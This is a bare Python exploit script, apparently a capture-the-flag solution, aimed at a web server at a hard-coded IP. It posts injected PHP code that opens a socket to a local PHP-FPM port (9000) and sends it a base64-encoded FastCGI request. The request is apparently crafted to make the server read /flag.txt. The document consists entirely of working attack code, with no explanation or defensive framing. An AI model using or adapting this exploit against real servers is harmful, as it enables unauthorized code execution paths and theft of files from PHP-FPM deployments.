#!/usr/bin/env python3
import requests
# 
b64 = 'AQH15AAIAAAAAQAAAAAAAAEE9eQBiQAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPDlNDUklQVF9GSUxFTkFNRS93ZWIvaW5kZXgucGhwCwpTQ1JJUFRfTkFNRS9pbmRleC5waHAMAFFVRVJZX1NUUklORwsKUkVRVUVTVF9VUkkvaW5kZXgucGhwDQVET0NVTUVOVF9ST09UL3dlYi8RCVJFUVVFU1RfQk9EWV9GSUxFL2ZsYWcudHh0Dw5TRVJWRVJfU09GVFdBUkVwaHAvZmNnaWNsaWVudAsJUkVNT1RFX0FERFIxMjcuMC4wLjELBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX0FERFIxMjcuMC4wLjELAlNFUlZFUl9QT1JUODALCVNFUlZFUl9OQU1FbG9jYWxob3N0DwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dA4EQ09OVEVOVF9MRU5HVEgxMDAwAQT15AAAAAABBfXkAAMAAEFBQQEF9eQAAAAA'
data = """
for($i=0;$i<5;$i+= 1){
	$s = fsockopen('localhost',9000);
	fwrite($s,base64_decode('AQH15AAIAAAAAQAAAAAAAAEE9eQBiQAAEQtHQVRFV0FZX0lOVEVSRkFDRUZhc3RDR0kvMS4wDgRSRVFVRVNUX01FVEhPRFBPU1QPDlNDUklQVF9GSUxFTkFNRS93ZWIvaW5kZXgucGhwCwpTQ1JJUFRfTkFNRS9pbmRleC5waHAMAFFVRVJZX1NUUklORwsKUkVRVUVTVF9VUkkvaW5kZXgucGhwDQVET0NVTUVOVF9ST09UL3dlYi8RCVJFUVVFU1RfQk9EWV9GSUxFL2ZsYWcudHh0Dw5TRVJWRVJfU09GVFdBUkVwaHAvZmNnaWNsaWVudAsJUkVNT1RFX0FERFIxMjcuMC4wLjELBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX0FERFIxMjcuMC4wLjELAlNFUlZFUl9QT1JUODALCVNFUlZFUl9OQU1FbG9jYWxob3N0DwhTRVJWRVJfUFJPVE9DT0xIVFRQLzEuMQwQQ09OVEVOVF9UWVBFYXBwbGljYXRpb24vdGV4dA4EQ09OVEVOVF9MRU5HVEgxMDAwAQT15AAAAAABBfXkAAMAAEFBQQEF9eQAAAAA'));
	fclose($s);
}

__halt_compiler();
""".strip()

r = requests.post('http://65.109.135.249:3000/index.php',data={'y':data})
print(r.text)
